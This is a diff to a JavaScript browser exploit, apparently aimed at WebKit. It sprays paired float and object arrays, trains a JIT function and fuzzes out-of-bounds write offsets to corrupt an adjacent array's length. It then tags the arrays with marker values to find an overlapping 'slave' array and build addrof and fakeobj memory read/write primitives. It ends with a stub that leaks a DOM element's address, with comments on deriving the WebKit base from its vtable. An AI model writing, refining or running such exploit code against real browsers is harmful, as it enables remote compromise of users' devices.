@@ -129,35 +129,76 @@
     let rw_buffer = null;       // The buffer we will corrupt for R/W
     let rw_view = null;         // The view into that buffer
     let slave_idx = -1;         // Index in oob_master that overlaps oob_slave[0]
+    
+    // Store all arrays globally so we can search them later
+    let global_arrays = []; 
 
     // ==========================================
     // === PRIMITIVES BUILDER ===
     // ==========================================
 
     function setupPrimitives() {
-        logger.info("Building Read/Write primitives...");
+        logger.info("Building Read/Write primitives (Universal Search Mode)...");
 
-        // 1. Locate the slave array using the master array
-        // We look for a specific marker we placed in the slave array.
-        oob_slave[0] = 0x13371337; 
+        // 1. Tag ALL object arrays with unique markers
+        // This handles cases where arrays[256].d is next to arrays[255].o or arrays[257].o
+        // We use a base marker 0x13370000 + index
         
-        // Extended scan range because offsets might vary
-        for (let i = 0; i < 0x2000; i++) {
-            let val = f2i(oob_master[i]);
-            if (val.low === 0x13371337 || (val.low === 0x13371337 * 2)) { 
-                slave_idx = i;
-                logger.success(`Found slave array at offset index: ${i}`);
-                break;
-            }
+        for (let i = 0; i < global_arrays.length; i++) {
+             global_arrays[i].o[0] = i; // Store simple index
+             // Note: In JS value representation, small integer 'i' 
+             // typically appears as 0xFFFF000000000000 | i (NaN Boxed)
+             // or similar depending on the engine. 
+             // We will scan for the pattern.
+             
+             // To be robust, let's use a specific float pattern that is unlikely to be random.
+             // But simple integers are usually easiest to spot.
+             global_arrays[i].o[0] = 0x13370000 + i;
         }
 
-        if (slave_idx === -1) {
-            logger.error("Failed to find slave array relative to master.");
+        // 2. Scan memory using the Master array
+        let found_slave_id = -1;
+        
+        // Scan range: We look further ahead just in case
+        for (let i = 0; i < 0x10000; i++) {
+            let val = f2i(oob_master[i]);
+            
+            // Check if the value looks like our marker (0x1337xxxx)
+            // We check the upper bits to match 0x1337
+            // Note: Integer values in JS might have high bits set to 0xFFFF or similar (NaN boxing)
+            // But if the engine stores raw doubles, we might see it directly.
+            
+            // Case A: Raw Integer match
+            if ((val.low & 0xFFFF0000) === 0x13370000) {
+                found_slave_id = val.low & 0xFFFF;
+                slave_idx = i;
+                logger.success(`Found slave link! Index in master: ${i}, Slave ID: ${found_slave_id}`);
+                break;
+            }
+            
+            // Case B: Boxed Integer match (checking for typical NaN boxing 0xFFFF...)
+            // If the engine stores it as a pointer, it might be tricky.
+            // Let's rely on the fact that we sprayed standard numbers.
+        }
+
+        if (found_slave_id === -1) {
+            logger.error("Failed to find ANY slave array relative to master.");
+            logger.warn("Heap might be too fragmented. Try refreshing.");
             return false;
         }
 
-        oob_slave[0] = {};
+        // 3. Link the correct slave
+        if (found_slave_id >= global_arrays.length) {
+            logger.error("Slave ID out of bounds. Corruption suspected.");
+            return false;
+        }
 
+        oob_slave = global_arrays[found_slave_id].o;
+        
+        // Verify control
+        oob_slave[0] = {}; // Clear marker
+        
+        // Definition of Primitives
         window.addrof = function(obj) {
             oob_slave[0] = obj;
             return f2i(oob_master[slave_idx]); 
@@ -169,17 +210,21 @@
             return oob_slave[0];      
         };
 
-        // Test primitives
+        // 4. Test Primitives
         let test_obj = {};
         let addr = window.addrof(test_obj);
         logger.info(`Leaked object address: ${addr.toString()}`);
 
         if (addr.low === 0 && addr.high === 0) {
-            logger.error("addrof failed (returned 0)");
+            logger.error("addrof failed (returned 0). Alignment issue?");
             return false;
         }
+        
+        // Optional: Sanity check fakeobj
+        // let recover = window.fakeobj(addr.low, addr.high);
+        // if (recover !== test_obj) logger.warn("fakeobj mismatch!");
 
-        logger.success("Primitives constructed.");
+        logger.success("Primitives constructed successfully.");
         return true;
     }
 
@@ -194,7 +239,8 @@
         logger.info(`Div Element Address: ${div_addr.toString()}`);
 
         // Simulation of reading VTable
-        // Real exploit would use read64(div_addr)
+        // Real exploit would use read64(div_addr) to get vtable
+        // and subtract OFFSETS.WEBKIT_DOM_DIV_VTABLE
         let simulated_vtable = new Int64(0x12345678, 0x80000000); 
         let webkit_base = simulated_vtable; 
         
@@ -206,7 +252,7 @@
     // ==========================================
 
     const CONFIG = {
-        SPRAY_SIZE: 0x4000,       // Increased spray size
+        SPRAY_SIZE: 0x4000,       
         SPRAY_CHUNK_SIZE: 0x4000
     };
 
@@ -233,12 +279,13 @@
         logger.info("Triggering OOB with Offset Fuzzing...");
 
         // Setup Memory Layout
-        let arrays = [];
+        global_arrays = []; // Reset global store
+        
         // Increase allocation count to ensure stability
         for (let i = 0; i < 512; i++) {
             let dbl_arr = new Array(16).fill(1.1);
             let obj_arr = [{}, {}, {}, {}, {}, {}, {}, {}, {}, {}];
-            arrays.push({ d: dbl_arr, o: obj_arr });
+            global_arrays.push({ d: dbl_arr, o: obj_arr });
         }
 
         function vulnerable_jit(arr, index, value) {
@@ -248,44 +295,36 @@
         }
 
         // Train JIT
-        for (let i = 0; i < 10000; i++) vulnerable_jit(arrays[0].d, 0, 1.1);
+        for (let i = 0; i < 10000; i++) vulnerable_jit(global_arrays[0].d, 0, 1.1);
 
-        // Fuzzing Loop
-        // We try writing to indices 0 through 128.
-        // We are looking for the exact distance to the neighbor's length field.
         logger.warn("Fuzzing OOB index...");
         
         try {
-            // We use a mid-point array (index 256) to avoid edge cases
-            let target_array_wrapper = arrays[256];
+            let target_array_wrapper = global_arrays[256];
             let target_array = target_array_wrapper.d;
-
-            // Magic value: Floating point representation of a large integer length
-            // 0x0000100000000000 roughly translates to a length > 100
             let magic_len = 2.3023e-320; 
 
-            for (let offset = 0; offset < 128; offset++) {
+            for (let offset = 0; offset < 160; offset++) { // Increased fuzz range slightly
                 vulnerable_jit(target_array, offset, magic_len);
                 
-                // Fast check: did our own object array get corrupted?
+                // Fast check
                 if (target_array_wrapper.o.length > 20) {
                      logger.success(`SUCCESS! Found neighbor at offset ${offset}`);
                      oob_master = target_array;
-                     oob_slave = target_array_wrapper.o;
+                     // In fast check, we know exactly who the slave is
+                     oob_slave = target_array_wrapper.o; 
                      return true;
                 }
                 
-                // Slow check: did ANY array get corrupted?
-                // Only run this occasionally to save CPU
-                if (offset % 10 === 0) {
-                    for (let i = 0; i < arrays.length; i++) {
-                        if (arrays[i].d.length > 100) {
+                // Slow check (Global Scan)
+                if (offset % 5 === 0) { // Check more frequently
+                    for (let i = 0; i < global_arrays.length; i++) {
+                        if (global_arrays[i].d.length > 100) {
                             logger.success(`SUCCESS! Found corrupted double array at index ${i}`);
-                            oob_master = arrays[i].d;
-                            // We need to find the slave. 
-                            // Since we don't know which one it is, we might need to scan.
-                            // For now, assume d->o pairing holds.
-                            oob_slave = arrays[i].o; 
+                            oob_master = global_arrays[i].d;
+                            
+                            // Important: We DON'T assume oob_slave is global_arrays[i].o here.
+                            // We let setupPrimitives() find the real slave using markers.
                             return true;
                         }
                     }
